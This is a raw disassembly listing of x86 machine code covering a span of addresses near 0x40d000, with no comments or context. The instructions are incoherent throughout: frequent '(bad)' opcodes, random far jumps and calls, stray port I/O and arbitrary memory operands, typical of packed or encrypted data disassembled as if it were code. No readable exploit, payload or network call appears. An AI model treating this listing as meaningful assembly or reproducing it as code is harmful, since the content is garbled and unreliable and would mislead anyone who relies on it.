  40cff4:	sar    DWORD PTR [eax+0x3260c272],1
  40cffa:	repnz cld 
  40cffc:	je     0x40cfcb
  40cffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfff:	or     ch,bl
  40d001:	xchg   BYTE PTR [edi],dh
  40d003:	adc    BYTE PTR [edx-0x78233103],ah
  40d009:	sub    al,0xc6
  40d00b:	(bad)  
  40d00c:	mov    dl,0x3
  40d00e:	outs   dx,BYTE PTR ds:[esi]
  40d00f:	xor    bh,cl
  40d011:	jmp    0xd17f:0xb244aefe
  40d018:	mov    eax,ds:0xe4a96cad
  40d01d:	jae    0x40cfb5
  40d01f:	(bad)
  40d022:	mov    dh,0xa1
  40d024:	out    dx,eax
  40d025:	cld    
  40d026:	mov    dl,0xcd
  40d028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d029:	(bad)  
  40d02b:	pop    edi
  40d02c:	pop    ecx
  40d02d:	xor    DWORD PTR [eax+0x12],ebp
  40d030:	fsub   DWORD PTR [esi]
  40d032:	adc    BYTE PTR [edi+0x20],al
  40d035:	ds sub bl,bl
  40d038:	inc    edx
  40d039:	in     al,0xca
  40d03b:	push   ebp
  40d03c:	mov    al,0x7b
  40d03e:	(bad)  
  40d03f:	pop    ebp
  40d040:	and    eax,0xb91bc506
  40d045:	mov    ds:0x2f505139,al
  40d04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d04b:	inc    esp
  40d04c:	ins    BYTE PTR es:[edi],dx
  40d04d:	push   0xfffffff5
  40d04f:	pop    ss
  40d050:	inc    DWORD PTR [edi+eax*2]
  40d053:	sbb    edi,ecx
  40d055:	push   ebx
  40d056:	jl     0x40d077
  40d058:	fstp   QWORD PTR [eax+0x4f]
  40d05b:	stc    
  40d05c:	or     edx,DWORD PTR [edx+0x16]
  40d05f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d060:	jno    0x40d0ab
  40d062:	jle    0x40d046
  40d064:	pop    esi
  40d065:	mov    eax,ds:0x61740daf
  40d06a:	popf   
  40d06b:	gs push edx
  40d06d:	into   
  40d06e:	mov    BYTE PTR [edi+ebp*8+0x5e236339],dh
  40d075:	loopne 0x40d08a
  40d077:	les    esi,FWORD PTR [eax-0xb]
  40d07a:	xchg   BYTE PTR [ebx+ebx*2],al
  40d07d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d07e:	retf   0xcd2a
  40d081:	outs   dx,DWORD PTR ds:[esi]
  40d082:	fcom   DWORD PTR [edx+0x3f]
  40d085:	pop    ecx
  40d086:	cmp    al,0x88
  40d088:	and    edi,DWORD PTR [edi]
  40d08a:	ins    DWORD PTR es:[edi],dx
  40d08b:	cmp    al,0xde
  40d08d:	jo     0x40d0cb
  40d08f:	ss inc esp
  40d091:	(bad)  
  40d093:	cld    
  40d094:	mov    eax,0xe1c63908
  40d099:	mov    al,ds:0x2baebc49
  40d09e:	hlt    
  40d09f:	push   es
  40d0a0:	sub    al,0x4d
  40d0a2:	pop    ss
  40d0a3:	dec    esp
  40d0a4:	add    al,0xfa
  40d0a6:	mov    ecx,0x513352e7
  40d0ab:	cmp    al,0x1d
  40d0ad:	lods   al,BYTE PTR ds:[esi]
  40d0ae:	test   ch,al
  40d0b0:	and    eax,0x84779be4
  40d0b5:	adc    BYTE PTR [esi+0x72],ch
  40d0b8:	imul   esp,DWORD PTR [eax],0x1ed4d58d
  40d0be:	or     DWORD PTR [edx+0x68],eax
  40d0c1:	(bad)  
  40d0c2:	jg     0x40d0cf
  40d0c4:	sbb    ch,BYTE PTR [ebp-0x53]
  40d0c7:	out    0xbd,eax
  40d0c9:	push   es
  40d0ca:	popa   
  40d0cb:	int3   
  40d0cc:	adc    DWORD PTR [edx+0x571834e],ebp
  40d0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0d3:	je     0x40d0b9
  40d0d5:	outs   dx,DWORD PTR ds:[esi]
  40d0d6:	cmp    al,0xcb
  40d0d8:	cdq    
  40d0d9:	inc    ecx
  40d0da:	sbb    al,0x5
  40d0dc:	(bad)  
  40d0dd:	push   cs
  40d0de:	enter  0xb849,0xac
  40d0e2:	push   0x3bc39f91
  40d0e7:	int    0xc5
  40d0e9:	scas   al,BYTE PTR es:[edi]
  40d0ea:	jno    0x40d0d5
  40d0ec:	jno    0x4c36db46
  40d0f2:	xchg   ecx,eax
  40d0f3:	call   0x911e63cb
  40d0f8:	cmc    
  40d0f9:	rcl    DWORD PTR [esi+ecx*4],cl
  40d0fc:	cli    
  40d0fd:	and    al,0xde
  40d0ff:	out    dx,al
  40d100:	shr    BYTE PTR [edi],1
  40d102:	and    bh,BYTE PTR [edx]
  40d104:	add    ebx,ebp
  40d106:	pop    esi
  40d107:	in     eax,dx
  40d108:	adc    ch,ah
  40d10a:	out    dx,al
  40d10b:	(bad)  
  40d10d:	cmp    cl,BYTE PTR [edi+edx*4-0x5c8faeed]
  40d114:	lods   eax,DWORD PTR ds:[esi]
  40d115:	cli    
  40d116:	add    esi,edx
  40d118:	jbe    0x40d0ab
  40d11a:	fs test al,0xec
  40d11d:	xchg   ebx,eax
  40d11e:	sbb    esi,DWORD PTR [ecx+ebp*4+0x8]
  40d122:	fisttp QWORD PTR [ecx+0x6]
  40d125:	inc    edi
  40d126:	or     eax,0x4ecaed9b
  40d12b:	pop    edi
  40d12c:	mov    ah,0x6a
  40d12e:	std    
  40d12f:	arpl   WORD PTR [esi+0x43dbe26e],sp
  40d135:	sbb    bh,cl
  40d137:	xor    eax,0x3b41127a
  40d13c:	adc    DWORD PTR ds:0x1ed61302,ebp
  40d142:	inc    edx
  40d143:	call   0xe383:0xcaa0aa30
  40d14a:	jle    0x40d0d9
  40d14c:	test   eax,0xc59e34b1
  40d151:	ss adc edx,edi
  40d154:	push   edx
  40d155:	test   eax,0x4bc03d19
  40d15a:	leave  
  40d15b:	xchg   esi,eax
  40d15c:	inc    ecx
  40d15d:	xor    BYTE PTR [ebx],0x10
  40d160:	mov    bl,BYTE PTR [eax+0x20]
  40d163:	int    0x15
  40d165:	pop    ecx
  40d166:	jb     0x40d146
  40d168:	jne    0x40d100
  40d16a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d16b:	retf   
  40d16c:	test   al,0x40
  40d16e:	test   BYTE PTR ss:[edi],ch
  40d171:	mov    ebx,0xab2d68f5
  40d176:	fnstcw WORD PTR [ecx-0x57f2f7d2]
  40d17c:	xor    BYTE PTR ds:0xbc036239,al
  40d182:	sub    eax,DWORD PTR [eax+0x45892f48]
  40d188:	xchg   edx,eax
  40d189:	cld    
  40d18a:	enter  0xa689,0x1e
  40d18e:	les    eax,FWORD PTR [edx-0x57]
  40d191:	fiadd  DWORD PTR [ecx]
  40d193:	arpl   WORD PTR [eax+0x2a349fe8],sp
  40d199:	sub    ecx,esp
  40d19b:	retf   0x94ca
  40d19e:	jmp    DWORD PTR [esi-0x7550515f]
  40d1a4:	popa   
  40d1a5:	enter  0x1339,0x5f
  40d1a9:	jmp    0xd7ec:0xf2b5f154
  40d1b0:	add    edx,DWORD PTR [ecx-0x7a1a8829]
  40d1b6:	inc    ebp
  40d1b7:	cdq    
  40d1b8:	test   DWORD PTR [edi-0x74],esi
  40d1bb:	mov    edx,0x640c6e82
  40d1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1c1:	popf   
  40d1c2:	mov    esp,0x7c878b5b
  40d1c7:	xchg   ecx,eax
  40d1c8:	mov    ds:0xd4ef9b84,eax
  40d1cd:	dec    ebp
  40d1ce:	outs   dx,BYTE PTR ds:[esi]
  40d1cf:	push   ds
  40d1d0:	xchg   edi,eax
  40d1d1:	xlat   BYTE PTR ds:[ebx]
  40d1d2:	out    0x90,eax
  40d1d4:	or     DWORD PTR [esi+0x79ce2dd1],eax
  40d1da:	shr    BYTE PTR [ebx-0x79],cl
  40d1dd:	xchg   ecx,eax
  40d1de:	xor    DWORD PTR [esi+0x592e8a35],edi
  40d1e4:	pop    ecx
  40d1e5:	add    eax,0x7f151fb
  40d1ea:	(bad)  
  40d1eb:	fnstcw WORD PTR [eax]
  40d1ed:	xchg   esi,eax
  40d1ee:	mov    al,0xa1
  40d1f0:	repnz out dx,al
  40d1f2:	in     al,0x91
  40d1f4:	mov    dh,dh
  40d1f6:	call   0xa195:0xd6b627c4
  40d1fd:	dec    eax
  40d1fe:	jge    0x40d1e9
  40d200:	sub    BYTE PTR [esi-0x36bb6d2],ch
  40d206:	xor    ah,cl
  40d208:	fwait
  40d209:	xchg   ebx,eax
  40d20a:	test   al,0xac
  40d20c:	push   edi
  40d20d:	adc    DWORD PTR [esi+0x31d53395],eax
  40d213:	js     0x40d284
  40d215:	and    esi,DWORD PTR [edi+0x1554689e]
  40d21b:	fisub  WORD PTR [ebp+0x13]
  40d21e:	pop    ss
  40d21f:	popa   
  40d220:	mov    al,0xfc
  40d222:	fnstsw WORD PTR [ebp+0x40]
  40d225:	adc    ebp,ebp
  40d227:	shr    dl,cl
  40d229:	sbb    edi,DWORD PTR [ecx+eax*2+0x10]
  40d22d:	in     eax,0x4d
  40d22f:	mov    ds:0xd76f0d68,eax
  40d234:	lods   eax,DWORD PTR ds:[esi]
  40d235:	sub    dl,BYTE PTR [edx+0x7c8db104]
  40d23b:	das    
  40d23c:	jb     0x40d1e6
  40d23e:	lods   eax,DWORD PTR ds:[esi]
  40d23f:	iret   
  40d240:	xchg   esp,eax
  40d241:	lods   al,BYTE PTR ds:[esi]
  40d242:	dec    eax
  40d243:	cmp    al,dh
  40d245:	pusha  
  40d246:	ret    0x358
  40d249:	push   cs
  40d24a:	push   cs
  40d24b:	in     eax,0x29
  40d24d:	leave  
  40d24e:	mov    bh,0x77
  40d250:	and    eax,0xc7ca1606
  40d255:	mov    ch,0x82
  40d257:	call   0xff46:0x35b8b46e
  40d25e:	pop    ds
  40d25f:	jno    0x40d285
  40d261:	call   0xf847:0x3c755c45
  40d268:	and    al,0x6d
  40d26a:	int    0x42
  40d26c:	pop    eax
  40d26d:	sub    al,0xf7
  40d26f:	mov    BYTE PTR [eax+0x428fd5f6],dh
  40d275:	pop    ds
  40d276:	push   edi
  40d277:	retf   
  40d278:	xchg   esi,eax
  40d279:	mov    ds:0xeca25d8,al
  40d27e:	cmp    BYTE PTR [edx],0x5
  40d281:	mov    dl,0xbd
  40d283:	or     esp,edx
  40d285:	jne    0x40d2b7
  40d287:	push   ecx
  40d288:	jmp    0x40d2fd
  40d28a:	or     al,0x46
  40d28c:	sbb    eax,0xb4bd4cc5
  40d291:	test   al,0xe7
  40d293:	xchg   DWORD PTR [eax],esi
  40d295:	ds je  0x40d2c5
  40d298:	cmp    dl,cl
  40d29a:	scas   al,BYTE PTR es:[edi]
  40d29b:	sub    DWORD PTR [edx],0xffffff9f
  40d29e:	or     BYTE PTR [edx-0x3752a260],dh
  40d2a4:	es jnp 0x40d2d2
  40d2a7:	add    ecx,DWORD PTR [ebx-0x7b]
  40d2aa:	mov    bl,BYTE PTR [ecx]
  40d2ac:	jle    0x40d2c4
  40d2ae:	cmp    al,0xe2
  40d2b0:	mov    ebp,eax
  40d2b2:	xchg   ebp,eax
  40d2b3:	jns    0x40d250
  40d2b5:	dec    ebx
  40d2b6:	mov    esp,0xa81d931b
  40d2bb:	fstp   TBYTE PTR [ebx]
  40d2bd:	cld    
  40d2be:	dec    esi
  40d2bf:	je     0x40d308
  40d2c1:	sahf   
  40d2c2:	int    0x34
  40d2c4:	aad    0x16
  40d2c6:	ins    DWORD PTR es:[edi],dx
  40d2c7:	mul    DWORD PTR [edi]
  40d2c9:	pushf  
  40d2ca:	dec    ecx
  40d2cb:	or     ebp,DWORD PTR [edi+0x598bbfbc]
  40d2d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2d2:	jns    0x40d2de
  40d2d4:	aaa    
  40d2d5:	mov    ecx,0xb1b45f51
  40d2da:	(bad)  
  40d2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2dc:	es je  0x40d2a6
  40d2df:	cmc    
  40d2e0:	cwde   
  40d2e1:	retf   
  40d2e2:	mov    ds:0xf852657f,eax
  40d2e7:	mov    al,0x5d
  40d2e9:	and    ebp,DWORD PTR [edi-0x11da9ee8]
  40d2ef:	ret    0xbf03
  40d2f2:	and    ebx,edx
  40d2f4:	nop
  40d2f5:	sbb    eax,0x9f7e28b6
  40d2fa:	mov    ds,WORD PTR [edx+ebx*8]
  40d2fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2fe:	inc    ebp
  40d2ff:	mov    bl,0xd5
  40d301:	mov    al,0x9f
  40d303:	les    esp,FWORD PTR cs:[ecx+0x2a]
  40d307:	pop    edi
  40d308:	fld    QWORD PTR [esi]
  40d30a:	(bad)  
  40d30b:	fistp  DWORD PTR [edx+0x5c]
  40d30e:	sbb    al,0xa
  40d310:	mov    ch,0xd7
  40d312:	stc    
  40d313:	outs   dx,DWORD PTR ds:[esi]
  40d314:	jns    0x40d361
  40d316:	dec    edi
  40d317:	inc    ebx
  40d318:	sub    DWORD PTR [esp+edi*4],edx
  40d31b:	adc    eax,0x2d752023
  40d320:	mov    WORD PTR [edi],es
  40d322:	or     edx,eax
  40d324:	push   ss
  40d325:	add    BYTE PTR [ecx],dl
  40d327:	adc    ah,cl
  40d329:	sti    
  40d32a:	sbb    DWORD PTR [ebp+0x77],ebp
  40d32d:	mov    ebx,0x221c54c
  40d332:	mov    esi,0x8ab926d2
  40d337:	jecxz  0x40d2d7
  40d339:	add    eax,0x450cfa0c
  40d33e:	jmp    0x734f:0xa070757b
  40d345:	retf   
  40d346:	je     0x40d340
  40d348:	jl     0x40d2ca
  40d34a:	pop    ecx
  40d34b:	push   es
  40d34c:	rol    DWORD PTR [ebp-0x72e13094],1
  40d352:	out    dx,al
  40d353:	mov    ?,WORD PTR [esi]
  40d355:	es mov dh,0xec
  40d358:	jb     0x40d3ac
  40d35a:	pop    esi
  40d35b:	add    eax,0x2dc03d01
  40d360:	ins    BYTE PTR es:[edi],dx
  40d361:	adc    al,0xa
  40d363:	retf   
  40d364:	xchg   DWORD PTR [ebp+0x4e],esi
  40d367:	pop    ds
  40d368:	imul   esi,eax,0x7ed1ada
  40d36e:	pop    eax
  40d36f:	sahf   
  40d370:	mov    cl,0x1b
  40d372:	mov    cl,0xa
  40d374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d375:	jg     0x40d2fa
  40d377:	mov    ch,0xe5
  40d379:	inc    ebx
  40d37a:	push   edi
  40d37b:	mov    ch,0xd0
  40d37d:	add    BYTE PTR [esp+esi*1-0x46],bh
  40d381:	sbb    al,BYTE PTR [edx+0x3b]
  40d384:	mov    eax,0x9122655e
  40d389:	int    0xce
  40d38b:	call   0x44d41530
  40d390:	mov    ch,0x84
  40d392:	add    al,0x54
  40d394:	dec    ecx
  40d395:	aam    0x40
  40d397:	leave  
  40d398:	push   ss
  40d399:	aam    0x3b
  40d39b:	aaa    
  40d39c:	dec    edi
  40d39d:	push   0x4a2dd2fd
  40d3a2:	bound  eax,QWORD PTR [edi-0xb]
  40d3a5:	pop    ebx
  40d3a6:	xlat   BYTE PTR ds:[ebx]
  40d3a7:	sub    ecx,esi
  40d3a9:	pop    ds
  40d3aa:	and    ebx,DWORD PTR [edx+0x69]
  40d3ad:	mov    al,0x4c
  40d3af:	or     eax,0x56b09dc
  40d3b4:	pop    edx
  40d3b5:	pop    edi
  40d3b6:	fcmovnu st,st(2)
  40d3b8:	scas   al,BYTE PTR es:[edi]
  40d3b9:	fidiv  WORD PTR [eax-0x2073d7a7]
  40d3bf:	inc    esp
  40d3c0:	imul   eax,ebp,0x6b
  40d3c3:	ror    DWORD PTR [edi-0x5a],0xf2
  40d3c7:	scas   al,BYTE PTR es:[edi]
  40d3c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3c9:	loopne 0x40d3f2
  40d3cb:	push   edx
  40d3cc:	ja     0x40d3cb
  40d3ce:	enter  0xd3b5,0x2e
  40d3d2:	mov    edx,0xf3b0e6ae
  40d3d7:	mov    cl,BYTE PTR [ebp-0x5e]
  40d3da:	inc    esi
  40d3db:	adc    edx,DWORD PTR [edx-0x2a]
  40d3de:	ret    
  40d3df:	push   edi
  40d3e0:	jecxz  0x40d37a
  40d3e2:	iret   
  40d3e3:	fwait
  40d3e4:	adc    eax,0xc78b9ba
  40d3e9:	sti    
  40d3ea:	daa    
  40d3eb:	mov    edx,0x97e9047e
  40d3f0:	clc    
  40d3f1:	mov    bh,0xbb
  40d3f3:	lock mov es,WORD PTR [ebp+0x41]
  40d3f7:	mov    dl,0x22
  40d3f9:	nop
  40d3fa:	sbb    eax,0x1f7d5dd6
  40d3ff:	sub    BYTE PTR [edi],bh
  40d401:	xor    al,0x8c
  40d403:	mov    WORD PTR [eax],fs
  40d405:	iret   
  40d406:	xchg   edx,eax
  40d407:	jmp    0xad26:0xc3c57e98
  40d40e:	repnz cmc 
  40d410:	mov    cs,WORD PTR [eax+0x20]
  40d413:	jmp    0xb82e:0x39af60cc
  40d41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d41b:	jle    0x40d3c8
  40d41d:	(bad)  
  40d41e:	aad    0x46
  40d420:	arpl   WORD PTR [eax+0x25f0162],dx
  40d426:	int    0xe8
  40d428:	xchg   ebp,eax
  40d429:	jne    0x40d3b1
  40d42b:	cmc    
  40d42c:	xchg   edi,eax
  40d42d:	aad    0x49
  40d42f:	enter  0xf45d,0x19
  40d433:	sub    dx,WORD PTR [ecx-0x796b9d55]
  40d43a:	adc    esp,DWORD PTR [eax-0x26]
  40d43d:	ret    
  40d43e:	aaa    
  40d43f:	add    edx,eax
  40d441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d442:	push   ecx
  40d443:	and    edx,DWORD PTR [edx]
  40d445:	mov    ds,WORD PTR [edi+edx*1-0x7b]
  40d449:	cs out dx,eax
  40d44b:	push   edi
  40d44c:	test   BYTE PTR [ecx-0x79],ah
  40d44f:	fild   DWORD PTR [esi+0x4a]
  40d452:	adc    BYTE PTR [esi+0x7aa8a518],dl
  40d458:	shl    BYTE PTR [esi+0x22],1
  40d45b:	pop    ds
  40d45c:	add    al,0x31
  40d45e:	fwait
  40d45f:	std    
  40d460:	xor    al,BYTE PTR [esi+ecx*2+0x30]
  40d464:	pop    es
  40d465:	inc    edi
  40d466:	adc    eax,0xcf8b41ba
  40d46b:	pop    esi
  40d46c:	in     al,dx
  40d46d:	test   al,0xf2
  40d46f:	cld    
  40d470:	sbb    BYTE PTR [edi-0x41e37de8],0xc2
  40d477:	push   esi
  40d478:	or     DWORD PTR [edi+0x33795a95],esp
  40d47e:	and    BYTE PTR [ebx+0x34d53f68],ah
  40d484:	mov    eax,0xcb2607dc
  40d489:	outs   dx,DWORD PTR ds:[esi]
  40d48a:	and    DWORD PTR [eax+0x58],ebx
  40d48d:	loop   0x40d444
  40d48f:	jb     0x40d4a2
  40d491:	sub    esp,DWORD PTR ds:0xded117fc
  40d497:	sub    ah,dl
  40d499:	fiadd  DWORD PTR [edi-0x30]
  40d49c:	(bad)  
  40d49d:	fwait
  40d49e:	push   ds
  40d49f:	xor    ah,ch
  40d4a1:	leave  
  40d4a2:	mov    ch,0xe6
  40d4a4:	cli    
  40d4a5:	cmp    ecx,DWORD PTR [edx]
  40d4a7:	mov    BYTE PTR [edi+0x58b13ef4],ch
  40d4ad:	xor    edi,DWORD PTR [eax-0x62347df8]
  40d4b3:	mov    DWORD PTR [ecx+edi*1],esp
  40d4b6:	xor    BYTE PTR [esi+0x1d],bh
  40d4b9:	mov    dh,0x9f
  40d4bb:	gs mov ch,bh
  40d4be:	jp     0x40d524
  40d4c0:	xchg   esi,eax
  40d4c1:	mov    dl,0xbb
  40d4c3:	iret   
  40d4c4:	dec    esi
  40d4c5:	lods   eax,DWORD PTR ds:[esi]
  40d4c6:	into   
  40d4c7:	and    bh,BYTE PTR [ebx]
  40d4c9:	jecxz  0x40d52e
  40d4cb:	push   ecx
  40d4cc:	adc    ah,dh
  40d4ce:	mov    al,ds:0xefdd62c7
  40d4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d4:	pop    ebx
  40d4d5:	(bad)  
  40d4d6:	(bad)  [ecx+0x49b9c0f5]
  40d4dc:	call   0x77ede500
  40d4e1:	xor    DWORD PTR [esp+ebx*8],0x40ecb1f7
  40d4e8:	xlat   BYTE PTR ds:[ebx]
  40d4e9:	aam    0xc2
  40d4eb:	aaa    
  40d4ec:	icebp  
  40d4ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4ee:	adc    eax,0x59a63b32
  40d4f3:	jo     0x40d506
  40d4f5:	test   BYTE PTR [ebp-0x6f],dl
  40d4f8:	jns    0x40d568
  40d4fa:	xchg   esi,edi
  40d4fc:	stos   DWORD PTR es:[edi],eax
  40d4fd:	cmp    al,0x19
  40d4ff:	xchg   dx,ax
  40d501:	pop    ecx
  40d502:	loope  0x40d489
  40d504:	lods   eax,DWORD PTR ds:[esi]
  40d505:	push   es
  40d506:	int3   
  40d507:	jge    0x40d508
  40d509:	aad    0xc3
  40d50b:	lea    ebx,[edx-0x7fe33e83]
  40d511:	mov    al,0x24
  40d513:	cdq    
  40d514:	fsub   DWORD PTR [ecx-0x7d]
  40d517:	add    eax,0xc3c954d3
  40d51c:	dec    eax
  40d51d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d51e:	cmc    
  40d51f:	adc    ebx,esp
  40d521:	push   edi
  40d522:	int    0x7c
  40d524:	ficom  DWORD PTR [edi-0x6]
  40d527:	fdivr  QWORD PTR [edi]
  40d529:	adc    eax,0xfa962c82
  40d52e:	or     dl,BYTE PTR [ebp-0x7c440f05]
  40d534:	adc    BYTE PTR [edx],0x73
  40d537:	iret   
  40d538:	ror    BYTE PTR [esi-0x51],1
  40d53b:	inc    esi
  40d53c:	jge    0x40d581
  40d53e:	dec    ecx
  40d53f:	adc    ch,BYTE PTR [ebx-0x48]
  40d542:	adc    esi,DWORD PTR [ebx-0x390f03e0]
  40d548:	outs   dx,BYTE PTR gs:[esi]
  40d54a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d54b:	mov    ebp,0xd10175d9
  40d550:	cmp    al,0x11
  40d552:	mov    ebx,0xab47811e
  40d557:	jae    0x40d590
  40d559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d55a:	dec    eax
  40d55b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d55c:	es mov bl,0xe5
  40d55f:	cdq    
  40d560:	mov    ch,0x62
  40d562:	(bad)  
  40d563:	nop
  40d564:	push   ds
  40d565:	enter  0x1dc9,0x7
  40d569:	cmp    eax,0xa09c7845
  40d56e:	retf   
  40d56f:	scas   al,BYTE PTR es:[edi]
  40d570:	dec    eax
  40d571:	ins    DWORD PTR es:[edi],dx
  40d572:	aam    0x9d
  40d574:	dec    eax
  40d575:	jne    0x40d4fa
  40d577:	adc    ch,al
  40d579:	ins    BYTE PTR es:[edi],dx
  40d57a:	(bad)  
  40d57d:	retf   
  40d57e:	imul   BYTE PTR [edx]
  40d580:	in     eax,0xbc
  40d582:	dec    esi
  40d583:	sbb    ch,BYTE PTR [esi+eax*1-0x1d44a021]
  40d58a:	jmp    0x6b8f79fc
  40d58f:	pushf  
  40d590:	sub    DWORD PTR [edx],edi
  40d592:	ds fwait
  40d594:	lea    edx,[ebp+0x19]
  40d597:	lods   al,BYTE PTR ds:[esi]
  40d598:	jae    0x40d5ac
  40d59a:	cmp    DWORD PTR [esi+ecx*2],0x2f0dfb08
  40d5a1:	or     DWORD PTR [ecx],esp
  40d5a3:	nop
  40d5a4:	mov    edi,0xd3996b1d
  40d5a9:	dec    edx
  40d5aa:	push   ds
  40d5ab:	enter  0xf170,0xa8
  40d5af:	push   ebp
  40d5b0:	stos   DWORD PTR es:[edi],eax
  40d5b1:	push   ecx
  40d5b2:	ja     0x40d5dc
  40d5b4:	call   0xafd2:0x4a46358b
  40d5bb:	xchg   edi,eax
  40d5bc:	jbe    0x40d62b
  40d5be:	jb     0x40d5d2
  40d5c0:	adc    al,0xb9
  40d5c2:	outs   dx,BYTE PTR ds:[esi]
  40d5c3:	push   esp
  40d5c4:	jbe    0x40d5d8
  40d5c6:	dec    esp
  40d5c7:	fs sbb al,0xce
  40d5ca:	pop    ecx
  40d5cb:	aas    
  40d5cc:	inc    eax
  40d5cd:	add    eax,0x4b2d8157
  40d5d2:	push   edx
  40d5d3:	and    BYTE PTR [ebx-0x632928b7],0x0
  40d5da:	adc    esp,DWORD PTR [edx-0x3f]
  40d5dd:	push   ebx
  40d5de:	gs gs xchg eax,ebx
  40d5e2:	xor    ebp,DWORD PTR [edi+0x4e]
  40d5e5:	sub    DWORD PTR [ecx+ecx*2+0x545b9d6d],esp
  40d5ec:	or     BYTE PTR [ebx+0x37734195],0x7d
  40d5f3:	fcomp  QWORD PTR [ecx+0x35]
  40d5f6:	pop    eax
  40d5f7:	add    ecx,DWORD PTR [edi+0x17cb7b8f]
  40d5fd:	fisubr DWORD PTR [eax-0x7e]
  40d600:	push   ecx
  40d601:	push   edx
  40d602:	scas   al,BYTE PTR es:[edi]
  40d603:	mov    ecx,0x66383144
  40d608:	inc    ebx
  40d609:	push   esp
  40d60a:	lea    eax,[ecx+0x47921af7]
  40d610:	jmp    0x678ce3ef
  40d615:	in     al,dx
  40d616:	jmp    0x553f:0x3f813cd1
  40d61d:	jo     0x40d68e
  40d61f:	dec    ecx
  40d620:	cmp    BYTE PTR ds:0x1e59ba31,ch
  40d626:	call   0x88e1:0xd089d3e3
  40d62d:	mov    bh,0x96
  40d62f:	adc    al,0xb0
  40d631:	sbb    edx,eax
  40d633:	mov    ds:0xf729fc59,al
  40d638:	das    
  40d639:	mov    cl,0xc0
  40d63b:	add    DWORD PTR [ecx-0x6fecf245],0xffffffad
  40d642:	cli    
  40d643:	lahf   
  40d644:	cmp    DWORD PTR [eax-0x9e645f8],eax
  40d64a:	es pop ds
  40d64c:	fnstsw WORD PTR [esi+0x35]
  40d64f:	cmp    ah,BYTE PTR [edx+0x5ca878ad]
  40d655:	mov    edx,0x7d72c3fc
  40d65a:	mov    ch,0xa1
  40d65c:	rcr    BYTE PTR [esp+ebx*4-0x755bdd4b],1
  40d663:	retf   
  40d664:	neg    DWORD PTR [ecx-0x74903a87]
  40d66a:	add    eax,0x459c7b02
  40d66f:	xor    ebx,DWORD PTR [esi+0x64]
  40d672:	shl    edx,0x83
  40d675:	inc    esi
  40d676:	inc    ecx
  40d677:	xor    edx,DWORD PTR [esi]
  40d679:	mov    ebp,0xf051bd13
  40d67e:	lds    ebp,FWORD PTR [ebp-0xf]
  40d681:	jge    0x40d6af
  40d683:	push   ebx
  40d684:	loopne 0x40d6bb
  40d686:	fldenv [eax-0x27]
  40d689:	adc    edx,DWORD PTR [edi-0x44ff7d96]
  40d68f:	(bad)  [ecx+0x16]
  40d692:	ret    
  40d693:	out    dx,al
  40d694:	scas   al,BYTE PTR es:[edi]
  40d695:	cs icebp 
  40d697:	dec    ebp
  40d698:	out    0x25,eax
  40d69a:	test   DWORD PTR [ecx-0x7],0xecd11cd7
  40d6a1:	das    
  40d6a2:	pop    ss
  40d6a3:	cmp    al,0x4
  40d6a5:	mov    bh,0x40
  40d6a7:	js     0x40d710
  40d6a9:	pop    ebp
  40d6aa:	xchg   ebp,eax
  40d6ab:	jne    0x40d649
  40d6ad:	ins    BYTE PTR es:[edi],dx
  40d6ae:	mov    esp,0x6aaabc71
  40d6b3:	inc    edi
  40d6b4:	inc    esp
  40d6b5:	or     bl,bh
  40d6b7:	jns    0x40d67d
  40d6b9:	inc    edx
  40d6ba:	fwait
  40d6bb:	xchg   edi,eax
  40d6bc:	xchg   ecx,eax
  40d6bd:	leave  
  40d6be:	imul   esp,DWORD PTR [ebp+0x2ddff3ad],0xffffff9e
  40d6c5:	mov    dl,0x96
  40d6c7:	xchg   ebx,eax
  40d6c8:	stc    
  40d6c9:	dec    ecx
  40d6ca:	mov    ah,BYTE PTR ds:0xad76a92
  40d6d0:	push   ss
  40d6d1:	mov    ds:0xb2cfa956,al
  40d6d6:	call   0xcd7e:0x94f3837e
  40d6dd:	sbb    DWORD PTR [eax],eax
  40d6df:	pop    ebx
  40d6e0:	xor    DWORD PTR [ebx+0x3f],0xffffffde
  40d6e4:	and    al,0xa6
  40d6e6:	inc    edx
  40d6e7:	fisubr DWORD PTR [eax+0x42]
  40d6ea:	jg     0x40d6d5
  40d6ec:	fcomp  DWORD PTR [eax-0x1b]
  40d6ef:	xor    eax,0xf634c3c5
  40d6f4:	dec    esi
  40d6f5:	popf   
  40d6f6:	pminub mm7,QWORD PTR [edx]
  40d6f9:	mov    al,ds:0x13e7ffc9
  40d6fe:	mov    al,0x52
  40d700:	hlt    
  40d701:	jae    0x40d6ae
  40d703:	test   al,0xc2
  40d705:	sbb    edx,DWORD PTR [edx+ebp*4+0x21]
  40d709:	or     DWORD PTR [eax],ebp
  40d70b:	mov    ebp,0xbaeab32b
  40d710:	pop    eax
  40d711:	mov    cl,dh
  40d713:	and    eax,0xe74d0109
  40d718:	pop    edx
  40d719:	xor    BYTE PTR [ebp+0x43],dh
  40d71c:	dec    ebx
  40d71d:	sbb    dl,BYTE PTR [edx]
  40d71f:	lods   al,BYTE PTR ds:[esi]
  40d720:	mov    BYTE PTR [ebp-0x27],cl
  40d723:	pop    edx
  40d724:	jp     0x40d6f9
  40d726:	leave  
  40d727:	retf   0x4c02
  40d72a:	mov    dh,0xa0
